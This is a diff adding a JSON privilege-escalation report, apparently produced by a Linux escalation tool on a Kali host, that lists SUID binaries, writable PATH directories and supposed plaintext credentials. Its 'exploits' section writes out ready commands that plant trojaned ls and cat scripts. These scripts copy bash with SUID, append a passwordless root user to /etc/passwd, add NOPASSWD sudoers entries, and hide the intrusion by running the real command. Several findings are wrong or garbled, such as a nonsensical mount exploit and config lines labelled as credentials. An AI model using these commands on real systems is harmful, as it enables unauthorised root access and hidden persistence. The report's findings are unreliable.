+            "path": "/usr/lib/xorg/Xorg.wrap",
+            "owner": "root",
+            "group": "root",
+            "permissions": "6755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/libexec/polkit-agent-helper-1",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/rsh-redone-rlogin",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/ntfs-3g",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/rsh",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/pkexec",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/fusermount",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/fusermount3",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/chfn",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/rlogin",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/sudoedit",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/mount",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "-o bind /bin/bash /bin/mount && /bin/mount -p",
+            "is_exploitable": true
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/su",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/sudo",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/sg",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/passwd",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/chsh",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/gpasswd",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/rsh-redone-rsh",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/umount",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/sbin/mount.nfs",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/sbin/umount.nfs",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/bin/newgrp",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/sbin/mount.smb3",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/sbin/mount.ntfs-3g",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/sbin/umount.nfs4",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/sbin/mount.cifs",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/sbin/mount.ntfs",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/sbin/mount.nfs4",
+            "owner": "root",
+            "group": "root",
+            "permissions": "4755",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "suid_binary",
+            "path": "/usr/sbin/pppd",
+            "owner": "root",
+            "group": "dip",
+            "permissions": "4754",
+            "exploit_method": "",
+            "is_exploitable": false
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/etc/alternatives/locate",
+            "owner": "root",
+            "group": "plocate",
+            "permissions": "2755",
+            "is_exploitable": false
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/usr/lib/x86_64-linux-gnu/utempter/utempter",
+            "owner": "root",
+            "group": "utmp",
+            "permissions": "2755",
+            "is_exploitable": false
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/usr/lib/xorg/Xorg.wrap",
+            "owner": "root",
+            "group": "root",
+            "permissions": "6755",
+            "is_exploitable": false
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/usr/bin/dotlockfile",
+            "owner": "root",
+            "group": "mail",
+            "permissions": "2755",
+            "is_exploitable": false
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/usr/bin/plocate",
+            "owner": "root",
+            "group": "plocate",
+            "permissions": "2755",
+            "is_exploitable": false
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/usr/bin/expiry",
+            "owner": "root",
+            "group": "shadow",
+            "permissions": "2755",
+            "is_exploitable": true
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/usr/bin/ssh-agent",
+            "owner": "root",
+            "group": "_ssh",
+            "permissions": "2755",
+            "is_exploitable": true
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/usr/bin/crontab",
+            "owner": "root",
+            "group": "crontab",
+            "permissions": "2755",
+            "is_exploitable": true
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/usr/bin/locate",
+            "owner": "root",
+            "group": "plocate",
+            "permissions": "2755",
+            "is_exploitable": false
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/usr/sbin/unix_chkpwd",
+            "owner": "root",
+            "group": "shadow",
+            "permissions": "2755",
+            "is_exploitable": true
+        },
+        {
+            "type": "sgid_binary",
+            "path": "/usr/bin/chage",
+            "owner": "root",
+            "group": "shadow",
+            "permissions": "2755",
+            "is_exploitable": true
+        },
+        {
+            "type": "world_writable_directory",
+            "path": "/tmp/.ICE-unix",
+            "owner": "root",
+            "group": "root",
+            "permissions": "1777",
+            "is_critical": false
+        },
+        {
+            "type": "plaintext_credentials",
+            "path": "/etc/nsswitch.conf",
+            "pattern": "(?i)passwd\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+            "matches": [
+                "files systemd winbind\ngroup:          files systemd winbind\nshadow:         files systemd\ngshadow:        files systemd\n\nhosts:          files mdns4_minimal [NOTFOUND=return] dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n"
+            ],
+            "creds_data": [
+                {
+                    "pattern": "(?i)passwd\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        "files systemd winbind\ngroup:          files systemd winbind\nshadow:         files systemd\ngshadow:        files systemd\n\nhosts:          files mdns4_minimal [NOTFOUND=return] dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n"
+                    ]
+                }
+            ],
+            "is_exploitable": true
+        },
+        {
+            "type": "plaintext_credentials",
+            "path": "/etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf",
+            "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+            "matches": [
+                "cups-pk-helper"
+            ],
+            "creds_data": [
+                {
+                    "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        "cups-pk-helper"
+                    ]
+                }
+            ],
+            "is_exploitable": true
+        },
+        {
+            "type": "plaintext_credentials",
+            "path": "/etc/idmapd.conf",
+            "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+            "matches": [
+                "nobody\nNobody-Group = nogroup\n"
+            ],
+            "creds_data": [
+                {
+                    "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        "nobody\nNobody-Group = nogroup\n"
+                    ]
+                }
+            ],
+            "is_exploitable": true
+        },
+        {
+            "type": "plaintext_credentials",
+            "path": "/etc/dbus-1/system.d/com.redhat.NewPrinterNotification.conf",
+            "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+            "matches": [
+                "root"
+            ],
+            "creds_data": [
+                {
+                    "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        "root"
+                    ]
+                }
+            ],
+            "is_exploitable": true
+        },
+        {
+            "type": "plaintext_credentials",
+            "path": "/etc/sqlmap/sqlmap.conf",
+            "pattern": "(?i)password\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+            "matches": [
+                "guessme\nrequestFile = \n\n# Rather than providing a target URL, let Google return target\n# hosts as result of your Google dork expression. For a list of Google\n# "
+            ],
+            "creds_data": [
+                {
+                    "pattern": "(?i)password\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        "guessme\nrequestFile = \n\n# Rather than providing a target URL, let Google return target\n# hosts as result of your Google dork expression. For a list of Google\n# "
+                    ]
+                }
+            ],
+            "is_exploitable": true
+        },
+        {
+            "type": "plaintext_credentials",
+            "path": "/etc/unicornscan/modules.conf",
+            "pattern": "(?i)password\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+            "matches": [
+                "scanit! host=localhost dbname=scan",
+                "scanit!"
+            ],
+            "creds_data": [
+                {
+                    "pattern": "(?i)password\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        "scanit! host=localhost dbname=scan",
+                        "scanit!"
+                    ]
+                },
+                {
+                    "pattern": "(?i)username\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        "scan"
+                    ]
+                }
+            ],
+            "is_exploitable": true
+        },
+        {
+            "type": "plaintext_credentials",
+            "path": "/var/lib/ucf/cache/:etc:idmapd.conf",
+            "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+            "matches": [
+                "nobody\nNobody-Group = nogroup\n"
+            ],
+            "creds_data": [
+                {
+                    "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        "nobody\nNobody-Group = nogroup\n"
+                    ]
+                }
+            ],
+            "is_exploitable": true
+        },
+        {
+            "type": "plaintext_credentials",
+            "path": "/etc/redsocks.conf",
+            "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+            "matches": [
+                "redsocks;\n\tgroup = redsocks;\n\t// chroot = "
+            ],
+            "creds_data": [
+                {
+                    "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        "redsocks;\n\tgroup = redsocks;\n\t// chroot = "
+                    ]
+                }
+            ],
+            "is_exploitable": true
+        },
+        {
+            "type": "plaintext_credentials",
+            "path": "/etc/apparmor/parser.conf",
+            "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+            "matches": [
+                ":other"
+            ],
+            "creds_data": [
+                {
+                    "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        ":other"
+                    ]
+                }
+            ],
+            "is_exploitable": true
+        },
+        {
+            "type": "plaintext_credentials",
+            "path": "/etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf",
+            "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+            "matches": [
+                "root"
+            ],
+            "creds_data": [
+                {
+                    "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                    "matches": [
+                        "root"
+                    ]
+                }
+            ],
+            "is_exploitable": true
+        },
+        {
+            "type": "writable_path_directory",
+            "path": "/home/kali/.local/bin",
+            "owner": "kali",
+            "group": "kali",
+            "permissions": "0755",
+            "is_exploitable": true
+        },
+        {
+            "type": "path_hijacking",
+            "command": "ls",
+            "writable_directory": "/home/kali/.local/bin",
+            "is_exploitable": true
+        },
+        {
+            "type": "path_hijacking",
+            "command": "cat",
+            "writable_directory": "/home/kali/.local/bin",
+            "is_exploitable": true
+        },
+        {
+            "type": "history_file_exposure",
+            "path": "/home/kali/.bash_history",
+            "pattern": "(?i)passwd",
+            "matches": [
+                "passwd"
+            ],
+            "is_exploitable": true
+        }
+    ],
+    "exploits": [
+        {
+            "type": "suid_binary",
+            "vulnerability": {
+                "type": "suid_binary",
+                "path": "/usr/bin/mount",
+                "owner": "root",
+                "group": "root",
+                "permissions": "4755",
+                "exploit_method": "-o bind /bin/bash /bin/mount && /bin/mount -p",
+                "is_exploitable": true
+            },
+            "command": "/usr/bin/mount -o bind /bin/bash /bin/mount && /bin/mount -p",
+            "description": "Exploit SUID binary mount to get a shell with elevated privileges"
+        },
+        {
+            "type": "path_hijacking",
+            "vulnerability": {
+                "type": "world_writable_directory",
+                "path": "/tmp/.ICE-unix",
+                "owner": "root",
+                "group": "root",
+                "permissions": "1777",
+                "is_critical": false
+            },
+            "command": "echo '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/.ICE-unix/ls && chmod +x /tmp/.ICE-unix/ls",
+            "description": "Create a malicious ls binary in /tmp/.ICE-unix to make /bin/bash SUID"
+        },
+        {
+            "type": "path_hijacking",
+            "vulnerability": {
+                "type": "world_writable_directory",
+                "path": "/tmp/.ICE-unix",
+                "owner": "root",
+                "group": "root",
+                "permissions": "1777",
+                "is_critical": false
+            },
+            "command": "echo '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/.ICE-unix/cat && chmod +x /tmp/.ICE-unix/cat",
+            "description": "Create a malicious cat binary in /tmp/.ICE-unix to make /bin/bash SUID"
+        },
+        {
+            "type": "plaintext_credentials",
+            "vulnerability": {
+                "type": "plaintext_credentials",
+                "path": "/etc/nsswitch.conf",
+                "pattern": "(?i)passwd\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                "matches": [
+                    "files systemd winbind\ngroup:          files systemd winbind\nshadow:         files systemd\ngshadow:        files systemd\n\nhosts:          files mdns4_minimal [NOTFOUND=return] dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n"
+                ],
+                "creds_data": [
+                    {
+                        "pattern": "(?i)passwd\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            "files systemd winbind\ngroup:          files systemd winbind\nshadow:         files systemd\ngshadow:        files systemd\n\nhosts:          files mdns4_minimal [NOTFOUND=return] dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n"
+                        ]
+                    }
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /etc/nsswitch.conf",
+            "description": "Extract plaintext credentials from /etc/nsswitch.conf"
+        },
+        {
+            "type": "plaintext_credentials",
+            "vulnerability": {
+                "type": "plaintext_credentials",
+                "path": "/etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf",
+                "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                "matches": [
+                    "cups-pk-helper"
+                ],
+                "creds_data": [
+                    {
+                        "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            "cups-pk-helper"
+                        ]
+                    }
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf",
+            "description": "Extract plaintext credentials from /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf"
+        },
+        {
+            "type": "plaintext_credentials",
+            "vulnerability": {
+                "type": "plaintext_credentials",
+                "path": "/etc/idmapd.conf",
+                "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                "matches": [
+                    "nobody\nNobody-Group = nogroup\n"
+                ],
+                "creds_data": [
+                    {
+                        "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            "nobody\nNobody-Group = nogroup\n"
+                        ]
+                    }
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /etc/idmapd.conf",
+            "description": "Extract plaintext credentials from /etc/idmapd.conf"
+        },
+        {
+            "type": "plaintext_credentials",
+            "vulnerability": {
+                "type": "plaintext_credentials",
+                "path": "/etc/dbus-1/system.d/com.redhat.NewPrinterNotification.conf",
+                "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                "matches": [
+                    "root"
+                ],
+                "creds_data": [
+                    {
+                        "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            "root"
+                        ]
+                    }
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /etc/dbus-1/system.d/com.redhat.NewPrinterNotification.conf",
+            "description": "Extract plaintext credentials from /etc/dbus-1/system.d/com.redhat.NewPrinterNotification.conf"
+        },
+        {
+            "type": "plaintext_credentials",
+            "vulnerability": {
+                "type": "plaintext_credentials",
+                "path": "/etc/sqlmap/sqlmap.conf",
+                "pattern": "(?i)password\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                "matches": [
+                    "guessme\nrequestFile = \n\n# Rather than providing a target URL, let Google return target\n# hosts as result of your Google dork expression. For a list of Google\n# "
+                ],
+                "creds_data": [
+                    {
+                        "pattern": "(?i)password\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            "guessme\nrequestFile = \n\n# Rather than providing a target URL, let Google return target\n# hosts as result of your Google dork expression. For a list of Google\n# "
+                        ]
+                    }
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /etc/sqlmap/sqlmap.conf",
+            "description": "Extract plaintext credentials from /etc/sqlmap/sqlmap.conf"
+        },
+        {
+            "type": "plaintext_credentials",
+            "vulnerability": {
+                "type": "plaintext_credentials",
+                "path": "/etc/unicornscan/modules.conf",
+                "pattern": "(?i)password\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                "matches": [
+                    "scanit! host=localhost dbname=scan",
+                    "scanit!"
+                ],
+                "creds_data": [
+                    {
+                        "pattern": "(?i)password\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            "scanit! host=localhost dbname=scan",
+                            "scanit!"
+                        ]
+                    },
+                    {
+                        "pattern": "(?i)username\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            "scan"
+                        ]
+                    }
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /etc/unicornscan/modules.conf",
+            "description": "Extract plaintext credentials from /etc/unicornscan/modules.conf"
+        },
+        {
+            "type": "plaintext_credentials",
+            "vulnerability": {
+                "type": "plaintext_credentials",
+                "path": "/var/lib/ucf/cache/:etc:idmapd.conf",
+                "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                "matches": [
+                    "nobody\nNobody-Group = nogroup\n"
+                ],
+                "creds_data": [
+                    {
+                        "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            "nobody\nNobody-Group = nogroup\n"
+                        ]
+                    }
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /var/lib/ucf/cache/:etc:idmapd.conf",
+            "description": "Extract plaintext credentials from /var/lib/ucf/cache/:etc:idmapd.conf"
+        },
+        {
+            "type": "plaintext_credentials",
+            "vulnerability": {
+                "type": "plaintext_credentials",
+                "path": "/etc/redsocks.conf",
+                "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                "matches": [
+                    "redsocks;\n\tgroup = redsocks;\n\t// chroot = "
+                ],
+                "creds_data": [
+                    {
+                        "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            "redsocks;\n\tgroup = redsocks;\n\t// chroot = "
+                        ]
+                    }
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /etc/redsocks.conf",
+            "description": "Extract plaintext credentials from /etc/redsocks.conf"
+        },
+        {
+            "type": "plaintext_credentials",
+            "vulnerability": {
+                "type": "plaintext_credentials",
+                "path": "/etc/apparmor/parser.conf",
+                "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                "matches": [
+                    ":other"
+                ],
+                "creds_data": [
+                    {
+                        "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            ":other"
+                        ]
+                    }
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /etc/apparmor/parser.conf",
+            "description": "Extract plaintext credentials from /etc/apparmor/parser.conf"
+        },
+        {
+            "type": "plaintext_credentials",
+            "vulnerability": {
+                "type": "plaintext_credentials",
+                "path": "/etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf",
+                "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                "matches": [
+                    "root"
+                ],
+                "creds_data": [
+                    {
+                        "pattern": "(?i)user\\s*[=:]\\s*[\\'\"]?([^\\'\"]+)[\\'\"]?",
+                        "matches": [
+                            "root"
+                        ]
+                    }
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf",
+            "description": "Extract plaintext credentials from /etc/dbus-1/system.d/com.redhat.PrinterDriversInstaller.conf"
+        },
+        {
+            "type": "path_hijacking",
+            "vulnerability": {
+                "type": "writable_path_directory",
+                "path": "/home/kali/.local/bin",
+                "owner": "kali",
+                "group": "kali",
+                "permissions": "0755",
+                "is_exploitable": true
+            },
+            "command": "echo '#!/bin/bash\\nchmod +s /bin/bash' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls",
+            "description": "Create a malicious ls binary in /home/kali/.local/bin (which is in PATH) to escalate privileges"
+        },
+        {
+            "type": "path_hijacking_bash_copy",
+            "vulnerability": {
+                "type": "path_hijacking",
+                "command": "ls",
+                "path": "/home/kali/.local/bin"
+            },
+            "command": "echo '#!/bin/bash\n    # Path hijacking exploit for ls\n    # Created by Advanced Linux Privilege Escalation Tool\n\n    # Create a copy of bash with SUID permissions\n    cp /bin/bash /tmp/.privbash-1742117624\n    chmod 4755 /tmp/.privbash-1742117624\n\n    # Leave evidence of successful execution\n    echo \"[+] Privilege escalation successful via ls path hijacking at $(date)\" > /tmp/.privesc-success-1742117624\n\n    # Run the original command to avoid detection\n    ls \"$@\"\n    ' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls",
+            "description": "Create a malicious ls binary in /home/kali/.local/bin that will create a SUID bash copy",
+            "usage": "After a privileged user runs this command, check /tmp/ for .privbash-* files and execute with -p flag",
+            "evidence_file": "/tmp/.privesc-success-1742117624"
+        },
+        {
+            "type": "path_hijacking_add_user",
+            "vulnerability": {
+                "type": "path_hijacking",
+                "command": "ls",
+                "path": "/home/kali/.local/bin"
+            },
+            "command": "echo '#!/bin/bash\n    # Path hijacking exploit for ls\n    # Created by Advanced Linux Privilege Escalation Tool\n\n    # Try to add a new root user\n    echo 'privesc::0:0::/root:/bin/bash' >> /etc/passwd\n    echo \"privesc:$(openssl passwd -1 -salt xyz privesc123):0:0::/root:/bin/bash\" >> /etc/passwd 2>/dev/null\n\n    # Leave evidence of successful execution\n    echo \"[+] User added via ls path hijacking at $(date)\" > /tmp/.privesc-useradd-1742117624\n\n    # Run the original command to avoid detection\n    ls \"$@\"\n    ' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls",
+            "description": "Create a malicious ls that will add a new root user to /etc/passwd",
+            "usage": "After a privileged user runs this command, try 'su privesc' with password 'privesc123'",
+            "evidence_file": "/tmp/.privesc-useradd-1742117624"
+        },
+        {
+            "type": "path_hijacking_sudo_exploit",
+            "vulnerability": {
+                "type": "path_hijacking",
+                "command": "ls",
+                "path": "/home/kali/.local/bin"
+            },
+            "command": "echo '#!/bin/bash\n    # Path hijacking exploit for ls\n    # Created by Advanced Linux Privilege Escalation Tool\n\n    # Try to use sudo to create a SUID binary\n    echo '#!/bin/bash\n    if [ $(id -u) -eq 0 ]; then\n        cp /bin/bash /tmp/.rootshell-1742117624\n        chmod 4755 /tmp/.rootshell-1742117624\n        echo \"Root shell created at /tmp/.rootshell-1742117624\"\n    fi' > /tmp/.sudoscript-1742117624\n    chmod +x /tmp/.sudoscript-1742117624\n\n    # Try various privilege escalation techniques silently\n    sudo /tmp/.sudoscript-1742117624 2>/dev/null || true\n    sudo -n /tmp/.sudoscript-1742117624 2>/dev/null || true\n\n    # Try to modify sudoers file\n    echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" | sudo tee -a /etc/sudoers 2>/dev/null || true\n\n    # Leave evidence of execution attempt\n    echo \"[+] Sudo exploitation attempt via ls path hijacking at $(date)\" > /tmp/.privesc-sudo-1742117624\n\n    # Run the original command to avoid detection\n    ls \"$@\"\n    ' > /home/kali/.local/bin/ls && chmod +x /home/kali/.local/bin/ls",
+            "description": "Create a malicious ls that tries various sudo techniques to gain root access",
+            "usage": "After a privileged user runs this command, check /tmp/ for .rootshell-* files or try 'sudo -l'",
+            "evidence_file": "/tmp/.privesc-sudo-1742117624"
+        },
+        {
+            "type": "path_hijacking_bash_copy",
+            "vulnerability": {
+                "type": "path_hijacking",
+                "command": "cat",
+                "path": "/home/kali/.local/bin"
+            },
+            "command": "echo '#!/bin/bash\n    # Path hijacking exploit for cat\n    # Created by Advanced Linux Privilege Escalation Tool\n\n    # Create a copy of bash with SUID permissions\n    cp /bin/bash /tmp/.privbash-1742117624\n    chmod 4755 /tmp/.privbash-1742117624\n\n    # Leave evidence of successful execution\n    echo \"[+] Privilege escalation successful via cat path hijacking at $(date)\" > /tmp/.privesc-success-1742117624\n\n    # Run the original command to avoid detection\n    cat \"$@\"\n    ' > /home/kali/.local/bin/cat && chmod +x /home/kali/.local/bin/cat",
+            "description": "Create a malicious cat binary in /home/kali/.local/bin that will create a SUID bash copy",
+            "usage": "After a privileged user runs this command, check /tmp/ for .privbash-* files and execute with -p flag",
+            "evidence_file": "/tmp/.privesc-success-1742117624"
+        },
+        {
+            "type": "path_hijacking_add_user",
+            "vulnerability": {
+                "type": "path_hijacking",
+                "command": "cat",
+                "path": "/home/kali/.local/bin"
+            },
+            "command": "echo '#!/bin/bash\n    # Path hijacking exploit for cat\n    # Created by Advanced Linux Privilege Escalation Tool\n\n    # Try to add a new root user\n    echo 'privesc::0:0::/root:/bin/bash' >> /etc/passwd\n    echo \"privesc:$(openssl passwd -1 -salt xyz privesc123):0:0::/root:/bin/bash\" >> /etc/passwd 2>/dev/null\n\n    # Leave evidence of successful execution\n    echo \"[+] User added via cat path hijacking at $(date)\" > /tmp/.privesc-useradd-1742117624\n\n    # Run the original command to avoid detection\n    cat \"$@\"\n    ' > /home/kali/.local/bin/cat && chmod +x /home/kali/.local/bin/cat",
+            "description": "Create a malicious cat that will add a new root user to /etc/passwd",
+            "usage": "After a privileged user runs this command, try 'su privesc' with password 'privesc123'",
+            "evidence_file": "/tmp/.privesc-useradd-1742117624"
+        },
+        {
+            "type": "path_hijacking_sudo_exploit",
+            "vulnerability": {
+                "type": "path_hijacking",
+                "command": "cat",
+                "path": "/home/kali/.local/bin"
